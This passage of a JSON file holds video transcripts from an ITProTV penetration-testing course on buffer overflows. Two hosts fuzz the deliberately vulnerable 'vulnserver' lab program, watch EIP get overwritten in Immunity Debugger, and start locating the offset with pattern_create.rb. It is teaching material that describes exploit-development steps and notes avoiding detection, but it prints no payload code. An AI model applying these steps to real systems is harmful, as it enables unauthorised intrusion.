5,000.\n\n407\n00:20:17.320 --> 00:20:19.880\nThat didn't, let's bump up to 7,500.\n\n408\n00:20:19.880 --> 00:20:22.370\nI'm gonna end up in the long run\nI think having fewer steps and\n\n409\n00:20:22.370 --> 00:20:23.770\nfewer interactions with that server.\n\n410\n00:20:23.770 --> 00:20:24.950\n&gt;&gt; Yeah, you make a great point.\n\n411\n00:20:24.950 --> 00:20:27.480\nI didn't even think about that but\nthat's exactly right.\n\n412\n00:20:27.480 --> 00:20:28.930\nYou gotta think about\nyour network traffic.\n\n413\n00:20:28.930 --> 00:20:32.150\nYou are making contact with\nthese machines in some way.\n\n414\n00:20:32.150 --> 00:20:35.380\nAnd it might alert suspicion if\nyou're going buck wild, right?\n\n415\n00:20:35.380 --> 00:20:37.370\nSo keep the buck wildness down.\n\n416\n00:20:37.370 --> 00:20:40.432\n&gt;&gt; Or maybe kicks in and\nblocks that port down and now you're SOL.\n\n417\n00:20:40.432 --> 00:20:42.380\n&gt;&gt; Now you're getting nowhere fast, right?\n\n418\n00:20:42.380 --> 00:20:45.110\nSo, I like to do it that way.\n\n419\n00:20:45.110 --> 00:20:46.220\nSo let's throw some more data at it.\n\n420\n00:20:46.220 --> 00:20:49.680\nLet's see if we can't bump up\nour game just a bit and go on.\n\n421\n00:20:49.680 --> 00:20:50.920\nSo I'll just rerun my script.\n\n422\n00:20:52.400 --> 00:20:53.593\nI'll say 2,000 this time.\n\n423\n00:20:53.593 --> 00:20:57.000\nHit return.\n\n424\n00:20:57.000 --> 00:20:59.930\nIt says it's sending the attack link but\nit's not exiting.\n\n425\n00:20:59.930 --> 00:21:01.790\nMaybe we've gotten somewhere.\n\n426\n00:21:01.790 --> 00:21:03.340\nLet's go over here.\n\n427\n00:21:03.340 --> 00:21:06.960\nStill says it's waiting for\nclient connections, okay.\n\n428\n00:21:06.960 --> 00:21:07.890\nOver here.\n\n429\n00:21:07.890 --> 00:21:10.340\nThen we go full screen real\nquickly to the bottom.\n\n430\n00:21:10.340 --> 00:21:12.420\nWe've definitely had some activity.\n\n431\n00:21:12.420 --> 00:21:13.980\nNotice it says paused.\n\n432\n00:21:15.090 --> 00:21:16.370\nWhy is it paused?\n\n433\n00:21:16.370 --> 00:21:20.083\nIt's paused because it does not\nknow what to do with this data.\n\n434\n00:21:20.083 --> 00:21:21.617\nWe have crashed the system.\n\n435\n00:21:21.617 --> 00:21:25.684\nSo Immunity has kind of like handled that.\n\n436\n00:21:25.684 --> 00:21:29.042\nMaybe I'm just hiding the crash report but\n\n437\n00:21:29.042 --> 00:21:33.060\nthe things we doing alright\nas far as Windows goes.\n\n438\n00:21:33.060 --> 00:21:35.409\nIt's not crashing into\nWindows too hard but\n\n439\n00:21:35.409 --> 00:21:38.467\nwe're definitely getting\nan error inside of Immunity.\n\n440\n00:21:38.467 --> 00:21:41.488\nAnd it said hey, what's going on here?\n\n441\n00:21:41.488 --> 00:21:46.716\nYou might want to take a look at something\ncuz I'm not seeing what I want to see.\n\n442\n00:21:46.716 --> 00:21:49.710\nAnd if you look over in\nthis registers area,\n\n443\n00:21:49.710 --> 00:21:53.210\nthis is where we start getting\ninto interesting things.\n\n444\n00:21:53.210 --> 00:21:56.746\nYou'll notice this EAX register.\n\n445\n00:21:56.746 --> 00:21:57.610\nWhat does it say?\n\n446\n00:21:57.610 --> 00:21:58.450\n&gt;&gt; That looks familiar to me.\n\n447\n00:21:58.450 --> 00:21:59.450\n&gt;&gt; That does look familiar.\n\n448\n00:21:59.450 --> 00:22:03.450\nThat is our input that\nwe sent to the machine.\n\n449\n00:22:03.450 --> 00:22:06.700\nIt got loaded, apparently,\ninto the EAX register.\n\n450\n00:22:06.700 --> 00:22:07.573\nAnd there it is.\n\n451\n00:22:07.573 --> 00:22:12.590\nI can click on it,\nright-click right here in this area.\n\n452\n00:22:12.590 --> 00:22:15.900\nAnd I go to Follow and Dump.\n\n453\n00:22:15.900 --> 00:22:17.920\nThat's interesting stuff right over here.\n\n454\n00:22:19.550 --> 00:22:21.720\nSo let me see here.\n\n455\n00:22:21.720 --> 00:22:23.512\nActually just let me make sure,\nyes it's at 16.\n\n456\n00:22:23.512 --> 00:22:25.500\nLook at all these As.\n\n457\n00:22:25.500 --> 00:22:29.398\nThese all the As that got\nsent to that register, 2000.\n\n458\n00:22:29.398 --> 00:22:33.390\nWe didn't completely fill it up thought,\nright?\n\n459\n00:22:33.390 --> 00:22:35.510\nWe got maybe halfway through.\n\n460\n00:22:37.030 --> 00:22:39.262\nBut you might be going,\nwhat are all those 41s?\n\n461\n00:22:39.262 --> 00:22:40.269\nAnd those 41s are important.\n\n462\n00:22:40.269 --> 00:22:45.595\nThose 41s are the hex equivalent\nof the capital letter A.\n\n463\n00:22:45.595 --> 00:22:51.520\nSo get use to working in hex\nvalues when you work here,\n\n464\n00:22:51.520 --> 00:22:55.270\nbecause all this over here,\nlook at that, see all these hex values.\n\n465\n00:22:55.270 --> 00:22:57.520\nSee all these, hex values.\n\n466\n00:22:57.520 --> 00:22:58.895\nLook, more hex values.\n\n467\n00:22:58.895 --> 00:23:00.110\n&gt;&gt; [LAUGH]\n&gt;&gt; There's hex values.\n\n468\n00:23:00.110 --> 00:23:01.240\nThere's hex values everywhere.\n\n469\n00:23:01.240 --> 00:23:04.890\nSo get prepared to be\nfrustrated with hex values,\n\n470\n00:23:04.890 --> 00:23:06.060\ncuz they definitely are frustrating.\n\n471\n00:23:06.060 --> 00:23:08.916\n&gt;&gt; Have your hex calculator ready anyway,\nif you're not, yeah.\n\n472\n00:23:08.916 --> 00:23:10.509\n[LAUGH]\n&gt;&gt; Now the good news is,\n\n473\n00:23:10.509 --> 00:23:16.050\nyou're gonna learn the hex values that\nwe're dealing with pretty quickly.\n\n474\n00:23:16.050 --> 00:23:19.170\nBecause we're gonna be doing a,\ncapital As, capital Bs, capital Cs.\n\n475\n00:23:19.170 --> 00:23:20.430\nAnd it's 41, 42, 43.\n\n476\n00:23:20.430 --> 00:23:23.125\nYou probably just learned that.\n\n477\n00:23:23.125 --> 00:23:23.970\n&gt;&gt; [LAUGH]\n&gt;&gt; So if\n\n478\n00:23:23.970 --> 00:23:27.930\nyou have a human brain that works,\nconsider that part done.\n\n479\n00:23:27.930 --> 00:23:30.032\nSo that's important.\n\n480\n00:23:30.032 --> 00:23:32.890\nLet's see here,\nwhat else do I want you guys to see?\n\n481\n00:23:32.890 --> 00:23:36.780\nLet's just look in the registers area yet\nagain really quickly.\n\n482\n00:23:36.780 --> 00:23:40.958\nYou got this EIP,\nthat is the instruction pointer.\n\n483\n00:23:40.958 --> 00:23:47.110\nThat is saying, here is where you get\nyour next set of instructions, okay?\n\n484\n00:23:47.110 --> 00:23:50.073\nAnd that is a 4 byte value.\n\n485\n00:23:50.073 --> 00:23:56.106\nSo this equals 00401D98 is 4 hex values,\n\n486\n00:23:56.106 --> 00:23:59.416\nequaling 4 bytes, okay?\n\n487\n00:23:59.416 --> 00:24:02.266\nWe're gonna need to know that\ninformation cuz we're gonna\n\n488\n00:24:02.266 --> 00:24:04.040\nbe manipulating that information.\n\n489\n00:24:05.660 --> 00:24:08.280\nThe ESP is also another good one to know.\n\n490\n00:24:08.280 --> 00:24:10.340\nThe stack pointer.\n\n491\n00:24:10.340 --> 00:24:12.610\nThese are extended registers, all right?\n\n492\n00:24:12.610 --> 00:24:14.900\nThe stack pointer there.\n\n493\n00:24:14.900 --> 00:24:18.780\nThe stack pointer is the top of the stack.\n\n494\n00:24:18.780 --> 00:24:21.960\nSo, whatever the last thing\nwas that was put on the stack,\n\n495\n00:24:21.960 --> 00:24:23.920\nthat's what is there, okay?\n\n496\n00:24:23.920 --> 00:24:27.820\nThen there's also EBP\nwhich is the base pointer.\n\n497\n00:24:27.820 --> 00:24:30.110\nI think it's the things at\nthe bottom of the stack.\n\n498\n00:24:31.320 --> 00:24:32.430\nSo, top and bottom.\n\n499\n00:24:32.430 --> 00:24:34.520\nWhatever goes in last comes out first.\n\n500\n00:24:34.520 --> 00:24:38.610\nAll right, so we're gonna be manipulating\nand working with these registers, so\n\n501\n00:24:38.610 --> 00:24:39.860\njust be prepared.\n\n502\n00:24:39.860 --> 00:24:40.480\nA lot of times,\n\n503\n00:24:40.480 --> 00:24:43.260\nwhat I'll want you to know about that\nis what are their values, right?\n\n504\n00:24:43.260 --> 00:24:44.990\nSo, that's what you're gonna wanna know.\n\n505\n00:24:46.250 --> 00:24:47.400\nLet's see what else we can learn.\n\n506\n00:24:47.400 --> 00:24:51.900\nSo, we sent up a bunch of As,\nbut we didn't get As in the EIP.\n\n507\n00:24:51.900 --> 00:24:53.150\nI want As in EIP.\n\n508\n00:24:54.360 --> 00:24:57.120\nI definitely wanna go there and beyond.\n\n509\n00:24:57.120 --> 00:24:59.410\nSo, 2000 got me to crash.\n\n510\n00:24:59.410 --> 00:25:00.850\nBut it didn't get me where I wanna be.\n\n511\n00:25:00.850 --> 00:25:02.440\nSo, I'm gonna send more data at it, and\n\n512\n00:25:02.440 --> 00:25:05.950\nhopefully I can overflow\ninto another register.\n\n513\n00:25:05.950 --> 00:25:08.960\nCuz we've stayed in the EAX register.\n\n514\n00:25:08.960 --> 00:25:09.880\nWe've sent input to it, but\n\n515\n00:25:09.880 --> 00:25:13.880\nwe haven't overflowed into other\nregisters, that's what we wanna do.\n\n516\n00:25:13.880 --> 00:25:16.320\nSo, send more As at it,\nand see what happens.\n\n517\n00:25:16.320 --> 00:25:18.830\n&gt;&gt; [LAUGH]\n&gt;&gt; So I need to, just hit the red x here,\n\n518\n00:25:18.830 --> 00:25:20.710\nthat closes that down.\n\n519\n00:25:20.710 --> 00:25:27.065\nAnd then we restart server, and then\nI'll restart Immunity and we re-attach.\n\n520\n00:25:31.696 --> 00:25:35.910\nServer there you are, and\nattach and then hit play.\n\n521\n00:25:35.910 --> 00:25:38.054\nAll right so, back on action,\n\n522\n00:25:38.054 --> 00:25:42.800\nlet's go back to our trusted\nlittle fuzzer and we re-run it.\n\n523\n00:25:42.800 --> 00:25:47.365\nAnd this time I will throw 3,000 at it.\n\n524\n00:25:47.365 --> 00:25:49.310\nHit return.\n\n525\n00:25:49.310 --> 00:25:51.470\nThere we go.\nDefinitely got a crash because it's\n\n526\n00:25:51.470 --> 00:25:53.520\nnot doing what we expect it to do.\n\n527\n00:25:53.520 --> 00:25:56.260\nIf we go back full screen just for\na second.\n\n528\n00:25:56.260 --> 00:25:59.930\nBottom right hand corner of the screen,\nwe are paused yet again.\n\n529\n00:25:59.930 --> 00:26:04.990\nAnd this time, if we look in the EIP,\nthe instruction pointer What is that?\n\n530\n00:26:04.990 --> 00:26:06.975\n41, 41, 41, 41.\n\n531\n00:26:06.975 --> 00:26:09.820\nWe have successfully sent data.\n\n532\n00:26:09.820 --> 00:26:14.460\nWe've overflowed that EAX register and\nit has gone into the EIP,\n\n533\n00:26:14.460 --> 00:26:16.290\nbecause it's showing me the six values.\n\n534\n00:26:16.290 --> 00:26:18.840\nI can probably follow that in the dump.\n\n535\n00:26:20.320 --> 00:26:22.460\nNo, it won't allow you to do\nthat if you're in the dump.\n\n536\n00:26:22.460 --> 00:26:27.130\nBut if you also notice above, look at\nall these As right here in the ESP.\n\n537\n00:26:27.130 --> 00:26:30.150\nWhere's the ESP and\nit's the top of the stack.\n\n538\n00:26:30.150 --> 00:26:33.620\nMeans it will be the first thing\nexecuted if it were a program.\n\n539\n00:26:33.620 --> 00:26:35.360\nBut there's nothing there.\n\n540\n00:26:35.360 --> 00:26:40.100\nIt crashed the system because AAAAAA and\non is not a program.\n\n541\n00:26:40.100 --> 00:26:41.440\nIt's just input.\n\n542\n00:26:41.440 --> 00:26:42.910\nDoesn't know what to do with that.\n\n543\n00:26:42.910 --> 00:26:43.750\nSo it crashed.\n\n544\n00:26:43.750 --> 00:26:45.040\nIt stopped working.\n\n545\n00:26:45.040 --> 00:26:48.650\nWe're gonna put arbitrary\ncode in these things.\n\n546\n00:26:48.650 --> 00:26:50.850\nAnd make them do what we want them to do,\nall right.\n\n547\n00:26:50.850 --> 00:26:51.860\nThat's what we're gonna do.\n\n548\n00:26:51.860 --> 00:26:54.650\nSo, it was good that\nwe overflowed the EAX,\n\n549\n00:26:54.650 --> 00:26:57.500\nwe overflowed into EIP that was\ndefinitely a good part of it.\n\n550\n00:26:57.500 --> 00:27:00.640\nAnd the ESP is where we're\ngonna store our malicious code,\n\n551\n00:27:00.640 --> 00:27:04.220\nand we've got plenty of\nroom there apparently and\n\n552\n00:27:04.220 --> 00:27:06.660\nwe can manipulate with that\ndata work with that data.\n\n553\n00:27:06.660 --> 00:27:08.310\nThat is where we are moving to next.\n\n554\n00:27:09.600 --> 00:27:13.450\n&gt;&gt; All right,\nDaniel perfect we are getting really close\n\n555\n00:27:13.450 --> 00:27:14.710\nto seeing this thing work.\n\n556\n00:27:14.710 --> 00:27:16.160\nWe found some important spots.\n\n557\n00:27:16.160 --> 00:27:20.490\nWe've actually successfully created\na fuzzer, that was great, right?\n\n558\n00:27:20.490 --> 00:27:21.800\nWe got to see Daniel do that.\n\n559\n00:27:21.800 --> 00:27:23.820\nWe applied that fuzzer at our application.\n\n560\n00:27:23.820 --> 00:27:27.550\nWe're able to crash the application,\nand we can see where that's data going.\n\n561\n00:27:27.550 --> 00:27:30.660\nSo, we're definitely on\nthe road to successfully\n\n562\n00:27:30.660 --> 00:27:33.580\nexecuting a buffer overflow\non this volt server.\n\n563\n00:27:33.580 --> 00:27:34.810\nFantastic.\n\n564\n00:27:34.810 --> 00:27:37.150\nGreat demonstrations Daniel,\nwe thank you for that.\n\n565\n00:27:37.150 --> 00:27:39.710\nWe hope everybody out there\nenjoyed watching this one,\n\n566\n00:27:39.710 --> 00:27:41.059\nobviously there is another one coming.\n\n567\n00:27:41.059 --> 00:27:43.050\n&gt;&gt; [LAUGH]\n&gt;&gt; So make sure you tune back in for\n\n568\n00:27:43.050 --> 00:27:46.680\npart three as we continue on with\nour series on buffer overflows,\n\n569\n00:27:46.680 --> 00:27:50.190\nwhich is a little mini series\nwithin our penetration testing.\n\n570\n00:27:50.190 --> 00:27:52.920\nSo again, thanks for watching,\nsigning off for ITProTV.\n\n571\n00:27:52.920 --> 00:27:53.694\nI've been your host Mike Rodrick.\n\n572\n00:27:53.694 --> 00:27:54.769\n&gt;&gt; I'm Daniel Lowrie.\n\n573\n00:27:54.769 --> 00:27:56.264\n&gt;&gt; And we'll see you next time.\n\n574\n00:27:56.264 --> 00:28:03.597\n[MUSIC]\n\n575\n00:28:03.597 --> 00:28:06.062\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202087190"
        },
        {
          "description": "In this episode, Dan and Mike continue to look at buffer overflow attacks. They use their debugger and pattern creators to determine the location of key registers.",
          "length": "1930",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-3-buffer_overflows_pt3-013117-PGM.00_33_21_00.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-3-buffer_overflows_pt3-013117-PGM.00_33_21_00.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-3-buffer_overflows_pt3-013117-PGM.00_33_21_00.Still001-sm.jpg",
          "title": "Buffer Overflows Part 3",
          "transcript": "WEBVTT\n\n1\n00:00:00.008 --> 00:00:01.108\nWelcome to ITProTV.\n\n2\n00:00:01.108 --> 00:00:02.188\nI'm your host, Don Pezet.\n\n3\n00:00:02.188 --> 00:00:04.382\n[CROSSTALK]\n\n4\n00:00:04.382 --> 00:00:08.063\n[MUSIC]\n\n5\n00:00:08.063 --> 00:00:10.547\n&gt;&gt; You're watching ITProTV.\n\n6\n00:00:10.547 --> 00:00:12.324\n[MUSIC]\n\n7\n00:00:12.324 --> 00:00:15.691\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n8\n00:00:15.691 --> 00:00:19.940\nI'm your host, Mike Rodrick, and\ntoday we're doing penetration testing.\n\n9\n00:00:19.940 --> 00:00:24.830\nIn this episode, we're gonna be continuing\nour thought process on buffer overflows.\n\n10\n00:00:24.830 --> 00:00:27.200\nWe've already done a couple parts\nwhere we're getting things set up, so\n\n11\n00:00:27.200 --> 00:00:29.350\nmake sure you go back and watch those.\n\n12\n00:00:29.350 --> 00:00:33.840\nAt this point, we've got things set up and\nwe've started sending some data\n\n13\n00:00:33.840 --> 00:00:37.450\ninto what we think is our vulnerable\napplication, doing fuzzing\n\n14\n00:00:37.450 --> 00:00:41.310\nwith our fuzzer that we wrote ourselves\nin a previous episode as well.\n\n15\n00:00:41.310 --> 00:00:43.750\nSo we're just gonna continue\non from that point,\n\n16\n00:00:43.750 --> 00:00:47.500\nand here to guide us the rest of\nthe way It's Mr Daniel Lowrie.\n\n17\n00:00:47.500 --> 00:00:48.360\nWelcome back, Daniel.\n\n18\n00:00:48.360 --> 00:00:49.580\n&gt;&gt; Mike, so glad to be back.\n\n19\n00:00:49.580 --> 00:00:53.500\nObviously we again left you guys with\na bit of a cliffhanger as we like to do.\n\n20\n00:00:53.500 --> 00:00:56.450\n&gt;&gt; We do.\n&gt;&gt; That gives wanting more salivating for\n\n21\n00:00:56.450 --> 00:00:59.120\nthe next part of that apple and\nthat's where we're gonna continue.\n\n22\n00:00:59.120 --> 00:01:01.520\nWe're gonna pick right\nback up where we left off.\n\n23\n00:01:01.520 --> 00:01:04.840\nLet's just quickly grasp\nwhere we should be.\n\n24\n00:01:04.840 --> 00:01:10.788\nAnd that was we ran our fuzzer, we sent\n3,000 bytes of data, which were all As.\n\n25\n00:01:10.788 --> 00:01:15.787\nWe sent 3,000 As to our system plus a\nlittle bit of a command at the beginning,\n\n26\n00:01:15.787 --> 00:01:18.720\nright, and\nwe were able to crash our program.\n\n27\n00:01:18.720 --> 00:01:21.980\nAnd we were able to overflow\ninto different registers.\n\n28\n00:01:21.980 --> 00:01:23.100\nAnd none of that makes sense to you?\n\n29\n00:01:23.100 --> 00:01:25.560\nThat means you need to go back and\nwatch part one.\n\n30\n00:01:25.560 --> 00:01:26.506\nAnd two, I guess.\n\n31\n00:01:26.506 --> 00:01:28.004\n[LAUGH] Definitely part two.\n\n32\n00:01:28.004 --> 00:01:31.960\nAnd you'll probably be able to\nfollow along a little bit better.\n\n33\n00:01:31.960 --> 00:01:32.980\nSo that's where we are.\n\n34\n00:01:32.980 --> 00:01:38.220\nAnd now we need to move into one of my\nfavorite parts of doing buffer overflows.\n\n35\n00:01:38.220 --> 00:01:43.090\nAnd it's finding the exact four\nbytes that the EIP takes up.\n\n36\n00:01:43.090 --> 00:01:49.710\nSo remember, we sent 3,000 As basically\nto our system, and it crashed it.\n\n37\n00:01:49.710 --> 00:01:52.434\nAnd we look at EIP, let's actually,\nlet's jump to my screen really quickly.\n\n38\n00:01:52.434 --> 00:01:55.544\nAnd we looked in,\nI left it up from our previous show.\n\n39\n00:01:55.544 --> 00:02:00.409\nYou'll notice that the EIP we\nsaw that it had 41, 41, 41,\n\n40\n00:02:00.409 --> 00:02:04.910\n41, which is the computer\nequivalent to four As.\n\n41\n00:02:04.910 --> 00:02:07.870\nI need to know exactly\nwhich four As those are.\n\n42\n00:02:07.870 --> 00:02:10.730\n&gt;&gt; That out of the 3,000,\nwhich four As ended up there, right?\n\n43\n00:02:10.730 --> 00:02:11.620\n&gt;&gt; Yeah, exactly.\n\n44\n00:02:12.940 --> 00:02:14.180\nThat's not easy, right?\n\n45\n00:02:14.180 --> 00:02:18.243\nThat's just like,\nanswer your question and out of 3,000.\n\n46\n00:02:18.243 --> 00:02:20.391\nYeah, that could be a little difficult.\n\n47\n00:02:20.391 --> 00:02:23.620\nAnd it is a little difficult,\nespecially if you do it the hard way.\n\n48\n00:02:23.620 --> 00:02:26.694\nWhich sometimes you may want to do,\nyou may have to do for various reasons.\n\n49\n00:02:26.694 --> 00:02:28.191\nI can't think of any off\nthe top of my head, but.\n\n50\n00:02:28.191 --> 00:02:31.226\n&gt;&gt; [LAUGH]\n&gt;&gt; Hey, I have done it, just so\n\n51\n00:02:31.226 --> 00:02:33.017\nthat I can say I did it.\n\n52\n00:02:33.017 --> 00:02:34.230\nIt took me an hour.\n\n53\n00:02:34.230 --> 00:02:36.031\n&gt;&gt; [LAUGH]\n&gt;&gt; But also the easy way,\n\n54\n00:02:36.031 --> 00:02:37.554\nwhich takes like four seconds.\n\n55\n00:02:37.554 --> 00:02:40.862\n&gt;&gt; [LAUGH]\n&gt;&gt; But what we gonna do is basically,\n\n56\n00:02:40.862 --> 00:02:44.790\nlet's explain the hard way so\nyou know what I'm talking about.\n\n57\n00:02:44.790 --> 00:02:52.090\nWhat I need to do is go, okay, I sent\n3,000 As, which, let's divide that up.\n\n58\n00:02:52.090 --> 00:02:56.323\nLet's send out 1,500 As and\n1,500 Bs, okay, and\n\n59\n00:02:56.323 --> 00:02:59.318\nthen let's see which one lands in the EIP.\n\n60\n00:02:59.318 --> 00:03:01.201\nIt's all one big string of data,\n\n61\n00:03:01.201 --> 00:03:05.380\nwe're just kinda splitting up what\nthe data is between As and Bs.\n\n62\n00:03:05.380 --> 00:03:09.540\nSo I'll spend 3,000 bytes of data,\nhalf of them will be As,\n\n63\n00:03:09.540 --> 00:03:11.040\nthe other half will be Bs.\n\n64\n00:03:11.040 --> 00:03:12.130\nI could do that.\n\n65\n00:03:12.130 --> 00:03:16.850\nThen I look, I say, did 41 show\nup in the EIP, or did 42 show up,\n\n66\n00:03:16.850 --> 00:03:19.270\nwhich is a B, in the EIP?\n\n67\n00:03:19.270 --> 00:03:21.700\nOkay, it was 42, for instance.\n\n68\n00:03:21.700 --> 00:03:26.150\nOkay, well, now I know that the EIP\ninformation, those four bytes I'm looking\n\n69\n00:03:26.150 --> 00:03:30.087\nfor, are in the latter half of\nthe 3,000 bytes of data that I sent.\n\n70\n00:03:30.087 --> 00:03:32.455\n&gt;&gt; You made some progress,\nyou went from 3,000 to 1,500.\n\n71\n00:03:32.455 --> 00:03:35.450\nI've only gotta figure out\nwhere 4 bytes in 1,500 is now.\n\n72\n00:03:35.450 --> 00:03:36.890\n&gt;&gt; That's right, whittling it down.\n\n73\n00:03:36.890 --> 00:03:38.520\nSo what do I do now?\n\n74\n00:03:38.520 --> 00:03:39.550\nI break that in half.\n\n75\n00:03:39.550 --> 00:03:41.918\nI say, okay, now I'm sending 750.\n\n76\n00:03:41.918 --> 00:03:44.577\n&gt;&gt; 1,500 Cs, 750 Bs.\n\n77\n00:03:44.577 --> 00:03:47.480\n&gt;&gt; And 750 Cs, right.\n\n78\n00:03:47.480 --> 00:03:49.720\nWhich one ends up in the EIP?\n\n79\n00:03:49.720 --> 00:03:51.850\nIs it B again or is it gonna be C, right?\n\n80\n00:03:51.850 --> 00:03:54.150\nNow I'm starting to figure out where.\n\n81\n00:03:54.150 --> 00:03:57.680\nAnd you just continue that\nprocess of having that, and\n\n82\n00:03:57.680 --> 00:03:58.940\nit takes a little bit of math.\n\n83\n00:03:58.940 --> 00:04:01.380\nIt takes a little bit of time\ncreating new variables so\n\n84\n00:04:01.380 --> 00:04:03.970\nthat you can find out which one does that.\n\n85\n00:04:03.970 --> 00:04:05.310\nThat's the hard way of doing it.\n\n86\n00:04:05.310 --> 00:04:07.540\nAnd eventually you'll be\nleft with one option,\n\n87\n00:04:07.540 --> 00:04:09.760\nthese are the four bytes that you need.\n\n88\n00:04:09.760 --> 00:04:10.430\nOkay, perfect.\n\n89\n00:04:10.430 --> 00:04:14.800\nThose four bytes landed on this side\nof the eight bytes that I sent.\n\n90\n00:04:14.800 --> 00:04:17.330\nAnd now I know where they are,\nI know exactly where that is.\n\n91\n00:04:17.330 --> 00:04:21.540\nHard way to do it, but it's probably\nsomething you'd wanna probably try.\n\n92\n00:04:21.540 --> 00:04:24.930\nAt least since you understand\nthe concept of what's happening and\n\n93\n00:04:24.930 --> 00:04:26.710\nyou were able to\nsuccessfully execute that.\n\n94\n00:04:28.090 --> 00:04:28.878\nNow the easy way.\n\n95\n00:04:28.878 --> 00:04:31.840\nThe good thing is that there\nare people who have realized that\n\n96\n00:04:31.840 --> 00:04:32.760\nthat is very difficult.\n\n97\n00:04:32.760 --> 00:04:34.430\nLet us help you with that.\n\n98\n00:04:34.430 --> 00:04:37.100\nAnd thank you,\ngood people who create these things.\n\n99\n00:04:37.100 --> 00:04:38.616\nI don't know who you are, but\n\n100\n00:04:38.616 --> 00:04:41.415\nI will send you a lovely fruit\nbasket if I ever find out.\n\n101\n00:04:41.415 --> 00:04:43.291\n&gt;&gt; [LAUGH]\n&gt;&gt; That being said,\n\n102\n00:04:43.291 --> 00:04:47.170\nlet's jump back into our computer and\nsee the easy way to do this.\n\n103\n00:04:47.170 --> 00:04:51.450\nAgain, I could go into my exploits and\ndo that, but I don't wanna do that.\n\n104\n00:04:51.450 --> 00:04:53.320\nI do need to Ctrl+C this.\n\n105\n00:04:53.320 --> 00:04:57.430\nThat will, let me kill all that,\nno virtual machine.\n\n106\n00:04:57.430 --> 00:04:58.068\nThere we go.\n\n107\n00:04:58.068 --> 00:04:59.880\nHere's what we're gonna do.\n\n108\n00:04:59.880 --> 00:05:03.604\nWe're gonna run a little thing called\na Ruby script actually, a Ruby program,\n\n109\n00:05:03.604 --> 00:05:06.398\ncalled pattern_create, or\npattern underscore create.\n\n110\n00:05:06.398 --> 00:05:12.170\nAnd it's gonna create a pattern\nof unique characters.\n\n111\n00:05:12.170 --> 00:05:14.783\nWow, that's interesting,\nwhy are we gonna do that?\n\n112\n00:05:14.783 --> 00:05:15.966\nI'm glad you asked,\n\n113\n00:05:15.966 --> 00:05:21.110\nbecause we're gonna create a pattern of\nunique characters that's 3,000 bytes long.\n\n114\n00:05:21.110 --> 00:05:22.350\nYou see where I'm going with this?\n\n115\n00:05:22.350 --> 00:05:26.786\nIf I have a unique string that\nthere's never repeating characters,\n\n116\n00:05:26.786 --> 00:05:29.932\nI'll be able to immediately\nfind where that is.\n\n117\n00:05:29.932 --> 00:05:34.050\nAnd then we're gonna use another Ruby\nscript to further us down that road.\n\n118\n00:05:34.050 --> 00:05:34.820\n&gt;&gt; Clever.\n\n119\n00:05:34.820 --> 00:05:35.703\n&gt;&gt; All right, so let's do that.\n\n120\n00:05:35.703 --> 00:05:39.523\nLet me fire up my vulnserver yet\nagain, run as administrator.\n\n121\n00:05:39.523 --> 00:05:42.550\nYeah, can you get out of my way,\nplease, the window?\n\n122\n00:05:42.550 --> 00:05:43.510\nThank you.\n\n123\n00:05:43.510 --> 00:05:47.440\nThere we go, run the system administrator,\nattach the service.\n\n124\n00:05:47.440 --> 00:05:53.289\nName, go down to vulnserve, and attach.\n\n125\n00:05:53.289 --> 00:05:55.830\nAnd hit the good old Play button.\n\n126\n00:05:55.830 --> 00:05:56.350\nSo here we go.\n\n127\n00:05:57.480 --> 00:06:01.210\nSo now we're going to take a look at our,\nlet me see here.\n\n128\n00:06:01.210 --> 00:06:04.840\nI created these beforehand, obviously,\nso that we don't have to do this.\n\n129\n00:06:04.840 --> 00:06:08.080\nLet's do the pattern_create thing first,\nlet's show you this.\n\n130\n00:06:08.080 --> 00:06:12.090\nI'm gonna locate, in Kali, it's already\nthere, you should be able to find it.\n\n131\n00:06:12.090 --> 00:06:15.740\nI'm pretty sure this comes preloaded\nwith all your Kali dist rows.\n\n132\n00:06:15.740 --> 00:06:22.854\nSo I'm gonna locate pattern_create.rb.\n\n133\n00:06:22.854 --> 00:06:23.969\nAnd there it is.\n\n134\n00:06:23.969 --> 00:06:25.792\nSo that's where this resides.\n\n135\n00:06:25.792 --> 00:06:27.835\nSo now I'm just gonna copy that.\n\n136\n00:06:32.190 --> 00:06:33.770\nAnd we are going to run it.\n\n137\n00:06:33.770 --> 00:06:35.800\nSo I'll paste it here.\n\n138\n00:06:37.770 --> 00:06:43.191\nAnd we are going to run the length,\nso -l and I'm gonna say 3000.\n\n139\n00:06:43.191 --> 00:06:48.590\nIt's churning away, it's doing its thing,\nit's creating this pattern for us.\n\n140\n00:06:48.590 --> 00:06:51.405\nAnd wowsers, that's a lot of data.\n\n141\n00:06:51.405 --> 00:06:56.494\nBut that's a 3,000 byte string of\nunique data that's never gonna repeat.\n\n142\n00:06:56.494 --> 00:07:00.300\n&gt;&gt; And 3,000 because during our\nfuzzing we realized that 3,000\n\n143\n00:07:00.300 --> 00:07:03.120\nwas the number that we could use and\nwe knew it would crash the program.\n\n144\n00:07:03.120 --> 00:07:04.860\n&gt;&gt; Correct, that's what we're doing.\n\n145\n00:07:04.860 --> 00:07:06.733\nTechnically it's a little\nbit less than that.\n\n146\n00:07:06.733 --> 00:07:10.951\nBut hey, the more space that you have,\nthe better, for your exploit\n\n147\n00:07:10.951 --> 00:07:15.670\nbecause then you can have larger\nexploit code, or shell code, to inject.\n\n148\n00:07:15.670 --> 00:07:17.790\nSo the more space you have, the better.\n\n149\n00:07:17.790 --> 00:07:20.220\nAnd we have 3,000,\nwhich is plenty for this.\n\n150\n00:07:20.220 --> 00:07:22.160\nSo there's our unique string.\n\n151\n00:07:22.160 --> 00:07:26.220\nWe would then add that\ninto our Python code,\n\n152\n00:07:26.220 --> 00:07:30.440\nour fuzzer, and\nsend that the way of vulnserve.\n\n153\n00:07:30.440 --> 00:07:36.100\nSo let's see here, I think I did\nthat into, let's see here, LS.\n\n154\n00:07:36.100 --> 00:07:39.030\nSo what I did was basically\njust copy this string like so.\n\n155\n00:07:39.030 --> 00:07:40.810\nRight-click, copy, like that.\n\n156\n00:07:40.810 --> 00:07:42.100\nYou know how to do that, copy and paste.\n\n157\n00:07:42.100 --> 00:07:42.850\nIt's a simple function.\n\n158\n00:07:43.930 --> 